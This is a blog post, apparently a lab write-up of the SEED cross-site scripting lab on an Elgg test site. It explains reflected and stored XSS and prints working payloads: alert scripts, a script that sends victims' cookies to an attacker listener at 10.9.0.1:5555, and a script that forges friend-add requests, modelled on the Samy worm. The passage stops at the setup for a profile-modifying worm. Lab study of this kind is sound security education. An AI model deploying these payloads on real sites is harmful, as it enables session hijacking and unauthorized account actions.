---
layout: post
title: Cross-Site Scripting
excerpt: Cross-site scripting (XSS) is a security vulnerability that allows attackers to inject malicious codes into web pages. XSS is introduced when a web application fails to properly sanitize user input before including it in a dynamically generated web content. This means that when regular users visit the affected website, their browsers unintentionally run the injected code, which can lead to different harmful activities. XXS can either be reflected or stored.
categories: xss
---

Cross-site scripting (XSS) is a security vulnerability that allows attackers to inject malicious codes into web pages. XSS is introduced when a web application fails to properly sanitize user input before including it in a dynamically generated web content. This means that when regular users visit the affected website, their browsers unintentionally run the injected code, which can lead to different harmful activities.

There are different types of XSS attacks, including:

- Reflected XSS: This type of XSS occurs when malicious code is injected into a website and then reflected back to user. This usually occurs through a malicious a link containing the injected code.

- Stored XSS: This type of XSS occurs when malicious code is permanently stored on a web server and then served to users whenever they access a specific page or resource. 

XSS posses a serious threat to web applications as they can allow attackers to steal sensitive information, manipulate users experience, and perform unauthorized actions. To prevent XSS vulnerabilities, web developers need to properly sanitize input gotten from users, encoding all content gotten from the user, and implement security measures such as Content Security Policy (CSP specifying what content can be executed on a website).

In this post, I aim to document my findings and observations while performing a SEED Lab.


###  Posting a Malicious Message to Display an Alert Window

For the puropse of this task, I assume the user samy. 

The purpose of this task is to embed a JavaScript program in a my profile page so that when other users view my profile, the JavaScript program will run and an alert window will be displayed. 

To accomplish this, I embed the following code in my profile page: `<script>alert('XSS');</script>`

***image***

After saving the changes made to my profile page, once anyone attempts to view Samy's profile, the script would run. This is true whether the user is logged in or not.

***image***

<br>

###  Posting a Malicious Message to Display Cookies

For the puropse of this task, I assume the user Samy. 

The purpose of this task is to embed a JavaScript program in a my profile page so that when other users view my profile, the user’s cookies will be displayed in an alert window.

To accomplish this, I embed the following code in my profile page: `<script>alert(document.cookie);</script>`

***image***

After saving the changes made to my profile page, once anyone attempts to view Samy's profile, the script would run. This is true whether the user is logged in or not.

***image***

<br>

### Stealing Cookies from the Victim’s Machine

The cookies being reflected to the user has no benefit to the attacker. What the attacker would want is to somehow get the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.

To accmplish this:

- I set up a server waiting for a connection from the malicious javascript

  `python3 -m http.server -b 10.9.0.1 5555`

- I set up a malicious javascript code that contacts the server with a GET request and the user's cookie as the data of the GET request

  ```javascript
    <script>
      document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' width=1px height=1px' + ' >');
    </script>
  ```

***image***

After saving the changes made to my profile page, once anyone attempts to view Samy's profile, the script would run. This is true whether the user is logged in or not.

***image***

<br>

### Becoming the Victim’s Friend

In 2005, Samy performned and XSS attack on Myspace that adds him as a friend to any other user that visits his page. The purpose of this task is to try and replicate what Samy did.

For anyone that visits Samy's page to automatically add him as a friend, the JavaScript code has to forge the  HTTP requests directly from the victim’s browser. Thus it is important to find out how the website crafts friends requests so we would know what needs to be sent to the server for the attack to be succesful.

To accomplish this, I embed the following code in my profile page:

```javascript
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59&" + ts + token
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

***image***

After saving the changes made to my profile page, once anyone view Samy's profile, the script would run and they add Samy as thier friend.

***image***

***image***

It is important that the text field where the code is placed is free from any form of formatting. This means always using `HTML mode` rather than `visual editor` as the visual editor introduces formatting that voids the code as seen below.

***image***

<br>

### Modifying the Victim’s Profile

The objective of this task is to modify the victim’s profile when the victim visits Samy’s page. Specifically,
modify the victim’s "About Me" field. We will write an XSS worm to complete the task. This worm does
not self-propagate; in task 6, we will make it self-propagating.
Similar to the previous task, we need to write a malicious JavaScript program that forges HTTP requests
directly from the victim’s browser, without the intervention of the attacker. To modify profile, we should
first find out how a legitimate user edits or modifies his/her profile in Elgg. More specifically, we need
to figure out how the HTTP POST request is constructed to modify a user’s profile. We will use Firefox’s
HTTP inspection tool. Once we understand how the modify-profile HTTP POST request looks like, we can
write a JavaScript program to send out the same HTTP request. We provide a skeleton JavaScript code that
aids in completing the task.
